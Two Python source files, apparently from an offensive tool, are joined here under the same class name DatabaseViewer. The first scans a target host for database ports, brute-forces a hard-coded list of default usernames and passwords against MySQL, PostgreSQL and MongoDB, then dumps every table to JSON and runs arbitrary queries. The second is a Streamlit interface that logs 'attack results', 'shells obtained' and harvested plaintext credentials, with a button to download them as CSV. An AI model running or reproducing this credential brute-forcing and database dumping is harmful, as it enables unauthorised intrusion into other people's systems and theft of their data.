import mysql.connector
import psycopg2
import pymongo
import sqlite3
import threading
import queue
import time
from typing import Dict, List, Any, Optional
import json
import os

class DatabaseViewer:
    """Advanced database viewer with automatic connection, bruteforce and dump capabilities"""
    
    def __init__(self):
        self.connections = {}
        self.attack_queue = queue.Queue()
        self.results_queue = queue.Queue()
        self.progress_callback = None
        
        # Common credentials for bruteforce
        self.common_creds = [
            ('root', ''),
            ('root', 'root'),
            ('root', 'password'),
            ('root', '123456'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('sa', ''),
            ('postgres', 'postgres'),
            ('mysql', 'mysql'),
            ('oracle', 'oracle')
        ]
    
    def set_progress_callback(self, callback):
        """Set callback for progress updates"""
        self.progress_callback = callback
    
    def _update_progress(self, message):
        """Update progress through callback"""
        if self.progress_callback:
            self.progress_callback(message)
    
    def discover_databases(self, target_host: str, port_range: List[int] = None) -> Dict[str, Any]:
        """Discover database services on target host"""
        if not port_range:
            port_range = [3306, 5432, 27017, 1433, 1521, 6379]  # MySQL, PostgreSQL, MongoDB, MSSQL, Oracle, Redis
        
        results = {
            'discovered_services': [],
            'connection_attempts': [],
            'successful_connections': []
        }
        
        self._update_progress(f"🔍 Scanning {target_host} for database services...")
        
        for port in port_range:
            service_type = self._identify_service(port)
            self._update_progress(f"→ Checking {service_type} on port {port}")
            
            if self._check_port_open(target_host, port):
                results['discovered_services'].append({
                    'host': target_host,
                    'port': port,
                    'service': service_type,
                    'status': 'open'
                })
                
                # Attempt connection with common credentials
                connection_results = self._bruteforce_credentials(target_host, port, service_type)
                results['connection_attempts'].extend(connection_results['attempts'])
                results['successful_connections'].extend(connection_results['successful'])
        
        return results
    
    def _identify_service(self, port: int) -> str:
        """Identify database service by port"""
        port_services = {
            3306: 'MySQL',
            5432: 'PostgreSQL', 
            27017: 'MongoDB',
            1433: 'MSSQL',
            1521: 'Oracle',
            6379: 'Redis'
        }
        return port_services.get(port, 'Unknown')
    
    def _check_port_open(self, host: str, port: int) -> bool:
        """Check if port is open"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _bruteforce_credentials(self, host: str, port: int, service_type: str) -> Dict[str, Any]:
        """Bruteforce common credentials"""
        results = {
            'attempts': [],
            'successful': []
        }
        
        self._update_progress(f"🔓 Bruteforcing {service_type} credentials on {host}:{port}")
        
        for username, password in self.common_creds:
            try:
                connection = None
                success = False
                
                if service_type == 'MySQL':
                    connection = mysql.connector.connect(
                        host=host, port=port, user=username, password=password, 
                        connection_timeout=3, autocommit=True
                    )
                    success = connection.is_connected()
                
                elif service_type == 'PostgreSQL':
                    connection = psycopg2.connect(
                        host=host, port=port, user=username, password=password,
                        database='postgres', connect_timeout=3
                    )
                    success = not connection.closed
                
                elif service_type == 'MongoDB':
                    from pymongo import MongoClient
                    connection = MongoClient(f'mongodb://{username}:{password}@{host}:{port}/', 
                                           serverSelectionTimeoutMS=3000)
                    connection.admin.command('ping')
                    success = True
                
                if success and connection:
                    self._update_progress(f"✅ Success! {username}:{password} on {service_type}")
                    results['successful'].append({
                        'host': host,
                        'port': port,
                        'service': service_type,
                        'username': username,
                        'password': password,
                        'connection': connection
                    })
                    self.connections[f"{host}:{port}"] = connection
                
                results['attempts'].append({
                    'credentials': f'{username}:{password}',
                    'success': success
                })
                
            except Exception as e:
                results['attempts'].append({
                    'credentials': f'{username}:{password}',
                    'success': False,
                    'error': str(e)
                })
                continue
        
        return results
    
    def dump_database(self, connection_key: str, output_path: str = './database_dumps/') -> Dict[str, Any]:
        """Dump database contents"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        host, port = connection_key.split(':')
        
        os.makedirs(output_path, exist_ok=True)
        dump_file = os.path.join(output_path, f"dump_{host}_{port}_{int(time.time())}.json")
        
        results = {
            'success': False,
            'dump_file': dump_file,
            'tables_dumped': [],
            'total_records': 0
        }
        
        try:
            self._update_progress(f"📁 Dumping database from {connection_key}")
            
            # MySQL dump
            if isinstance(connection, mysql.connector.connection.MySQLConnection):
                cursor = connection.cursor()
                
                # Get databases
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall() if db[0] not in ['information_schema', 'mysql', 'performance_schema', 'sys']]
                
                dump_data = {}
                for database in databases:
                    self._update_progress(f"→ Dumping database: {database}")
                    cursor.execute(f"USE {database}")
                    
                    # Get tables
                    cursor.execute("SHOW TABLES")
                    tables = [table[0] for table in cursor.fetchall()]
                    
                    dump_data[database] = {}
                    for table in tables:
                        self._update_progress(f"  → Dumping table: {table}")
                        cursor.execute(f"SELECT * FROM {table}")
                        rows = cursor.fetchall()
                        
                        # Get column names
                        cursor.execute(f"DESCRIBE {table}")
                        columns = [col[0] for col in cursor.fetchall()]
                        
                        dump_data[database][table] = {
                            'columns': columns,
                            'rows': [dict(zip(columns, row)) for row in rows]
                        }
                        
                        results['tables_dumped'].append(f"{database}.{table}")
                        results['total_records'] += len(rows)
                
                cursor.close()
            
            # PostgreSQL dump
            elif hasattr(connection, 'cursor'):
                cursor = connection.cursor()
                
                # Get tables
                cursor.execute("SELECT tablename FROM pg_tables WHERE schemaname = 'public'")
                tables = [table[0] for table in cursor.fetchall()]
                
                dump_data = {'public': {}}
                for table in tables:
                    self._update_progress(f"→ Dumping table: {table}")
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    
                    # Get column names
                    cursor.execute(f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'")
                    columns = [col[0] for col in cursor.fetchall()]
                    
                    dump_data['public'][table] = {
                        'columns': columns,
                        'rows': [dict(zip(columns, row)) for row in rows]
                    }
                    
                    results['tables_dumped'].append(table)
                    results['total_records'] += len(rows)
                
                cursor.close()
            
            # Save dump to file
            with open(dump_file, 'w') as f:
                json.dump(dump_data, f, indent=2, default=str)
            
            results['success'] = True
            self._update_progress(f"✅ Database dump completed: {dump_file}")
            
        except Exception as e:
            results['error'] = str(e)
            self._update_progress(f"❌ Dump failed: {str(e)}")
        
        return results
    
    def execute_query(self, connection_key: str, query: str) -> Dict[str, Any]:
        """Execute custom query on database"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        
        try:
            cursor = connection.cursor()
            cursor.execute(query)
            
            if query.strip().upper().startswith('SELECT'):
                results = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description]
                
                return {
                    'success': True,
                    'columns': columns,
                    'rows': [dict(zip(columns, row)) for row in results],
                    'row_count': len(results)
                }
            else:
                connection.commit()
                return {
                    'success': True,
                    'message': f'Query executed successfully. Affected rows: {cursor.rowcount}'
                }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            cursor.close()
    
    def get_database_info(self, connection_key: str) -> Dict[str, Any]:
        """Get detailed database information"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        
        try:
            cursor = connection.cursor()
            info = {'success': True, 'databases': {}}
            
            # MySQL info
            if isinstance(connection, mysql.connector.connection.MySQLConnection):
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
                
                for database in databases:
                    cursor.execute(f"USE {database}")
                    cursor.execute("SHOW TABLES")
                    tables = [table[0] for table in cursor.fetchall()]
                    
                    table_info = {}
                    for table in tables:
                        cursor.execute(f"SELECT COUNT(*) FROM {table}")
                        row_count = cursor.fetchone()[0]
                        
                        cursor.execute(f"DESCRIBE {table}")
                        columns = cursor.fetchall()
                        
                        table_info[table] = {
                            'row_count': row_count,
                            'columns': [{'name': col[0], 'type': col[1], 'key': col[3]} for col in columns]
                        }
                    
                    info['databases'][database] = table_info
            
            cursor.close()
            return info
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def close_connections(self):
        """Close all database connections"""
        for key, connection in self.connections.items():
            try:
                connection.close()
            except:
                pass
        self.connections.clear()
import streamlit as st
import sqlite3
import pandas as pd
import json
from datetime import datetime
import os

class DatabaseViewer:
    def __init__(self):
        self.db_path = "vulnerability_scanner.db"
        self.init_database()
    
    def init_database(self):
        """Initialize the database with required tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Scan results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                scan_date TEXT NOT NULL,
                total_vulnerabilities INTEGER,
                critical_count INTEGER,
                high_count INTEGER,
                medium_count INTEGER,
                low_count INTEGER,
                results_json TEXT,
                status TEXT DEFAULT 'completed'
            )
        ''')
        
        # Attack results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                target_url TEXT NOT NULL,
                attack_date TEXT NOT NULL,
                total_attacks INTEGER,
                successful_attacks INTEGER,
                extracted_data TEXT,
                credentials_found TEXT,
                shells_obtained TEXT,
                attack_details TEXT,
                FOREIGN KEY (scan_id) REFERENCES scan_results (id)
            )
        ''')
        
        # Credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS discovered_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                discovery_date TEXT NOT NULL,
                service TEXT,
                username TEXT,
                password TEXT,
                method TEXT,
                source TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_scan_results(self, results):
        """Save scan results to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        vulnerabilities = results.get('vulnerabilities', [])
        critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
        high = len([v for v in vulnerabilities if v['severity'] == 'High'])
        medium = len([v for v in vulnerabilities if v['severity'] == 'Medium'])
        low = len([v for v in vulnerabilities if v['severity'] == 'Low'])
        
        cursor.execute('''
            INSERT INTO scan_results 
            (target_url, scan_date, total_vulnerabilities, critical_count, high_count, medium_count, low_count, results_json)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            results.get('target_url', ''),
            datetime.now().isoformat(),
            len(vulnerabilities),
            critical, high, medium, low,
            json.dumps(results)
        ))
        
        scan_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return scan_id
    
    def save_attack_results(self, scan_id, attack_results, target_url):
        """Save attack results to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_results 
            (scan_id, target_url, attack_date, total_attacks, successful_attacks, extracted_data, credentials_found, shells_obtained, attack_details)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            scan_id,
            target_url,
            datetime.now().isoformat(),
            attack_results.get('total_attacks', 0),
            attack_results.get('successful_exploits', 0),
            json.dumps(attack_results.get('extracted_data', [])),
            json.dumps(attack_results.get('credentials_found', [])),
            json.dumps(attack_results.get('shells_obtained', [])),
            json.dumps(attack_results.get('attack_details', []))
        ))
        
        # Save credentials separately
        for cred in attack_results.get('credentials_found', []):
            cursor.execute('''
                INSERT INTO discovered_credentials
                (target_url, discovery_date, service, username, password, method, source)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                target_url,
                datetime.now().isoformat(),
                cred.get('service', ''),
                cred.get('username', ''),
                cred.get('password', ''),
                cred.get('method', ''),
                'attack_engine'
            ))
        
        conn.commit()
        conn.close()
    
    def get_scan_history(self):
        """Get scan history from database"""
        conn = sqlite3.connect(self.db_path)
        df = pd.read_sql_query('''
            SELECT id, target_url, scan_date, total_vulnerabilities, 
                   critical_count, high_count, medium_count, low_count, status
            FROM scan_results 
            ORDER BY scan_date DESC
        ''', conn)
        conn.close()
        return df
    
    def get_attack_history(self):
        """Get attack history from database"""
        conn = sqlite3.connect(self.db_path)
        df = pd.read_sql_query('''
            SELECT target_url, attack_date, total_attacks, successful_attacks
            FROM attack_results 
            ORDER BY attack_date DESC
        ''', conn)
        conn.close()
        return df
    
    def get_credentials(self):
        """Get discovered credentials from database"""
        conn = sqlite3.connect(self.db_path)
        df = pd.read_sql_query('''
            SELECT target_url, discovery_date, service, username, password, method
            FROM discovered_credentials 
            ORDER BY discovery_date DESC
        ''', conn)
        conn.close()
        return df
    
    def display_database_viewer(self):
        """Display database viewer interface"""
        st.header("🗄️ Database Viewer")
        
        tab1, tab2, tab3, tab4 = st.tabs(["📊 Scan History", "⚔️ Attack History", "🔑 Credentials", "🗑️ Management"])
        
        with tab1:
            st.subheader("Scan History")
            scan_df = self.get_scan_history()
            if not scan_df.empty:
                st.dataframe(scan_df, use_container_width=True)
                
                # Show details for selected scan
                if st.selectbox("Select scan for details", scan_df['id'].tolist()):
                    scan_id = st.selectbox("Select scan for details", scan_df['id'].tolist())
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT results_json FROM scan_results WHERE id = ?", (scan_id,))
                    result = cursor.fetchone()
                    if result:
                        scan_results = json.loads(result[0])
                        st.json(scan_results)
                    conn.close()
            else:
                st.info("No scan history available")
        
        with tab2:
            st.subheader("Attack History")
            attack_df = self.get_attack_history()
            if not attack_df.empty:
                st.dataframe(attack_df, use_container_width=True)
            else:
                st.info("No attack history available")
        
        with tab3:
            st.subheader("Discovered Credentials")
            cred_df = self.get_credentials()
            if not cred_df.empty:
                st.dataframe(cred_df, use_container_width=True)
                
                # Download credentials as CSV
                csv = cred_df.to_csv(index=False)
                st.download_button(
                    label="📥 Download Credentials CSV",
                    data=csv,
                    file_name=f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                    mime="text/csv"
                )
            else:
                st.info("No credentials discovered yet")
        
        with tab4:
            st.subheader("Database Management")
            
            col1, col2 = st.columns(2)
            
            with col1:
                if st.button("🗑️ Clear Scan History"):
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute("DELETE FROM scan_results")
                    conn.commit()
                    conn.close()
                    st.success("Scan history cleared!")
            
            with col2:
                if st.button("🗑️ Clear All Data"):
                    conn = sqlite3.connect(self.db_path)
                    cursor = conn.cursor()
                    cursor.execute("DELETE FROM scan_results")
                    cursor.execute("DELETE FROM attack_results")
                    cursor.execute("DELETE FROM discovered_credentials")
                    conn.commit()
                    conn.close()
                    st.success("All data cleared!")
            
            # Database stats
            st.subheader("📊 Database Statistics")
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM scan_results")
            scan_count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM attack_results")
            attack_count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM discovered_credentials")
            cred_count = cursor.fetchone()[0]
            
            conn.close()
            
            col1, col2, col3 = st.columns(3)
            with col1:
                st.metric("Total Scans", scan_count)
            with col2:
                st.metric("Total Attacks", attack_count)
            with col3:
                st.metric("Total Credentials", cred_count)
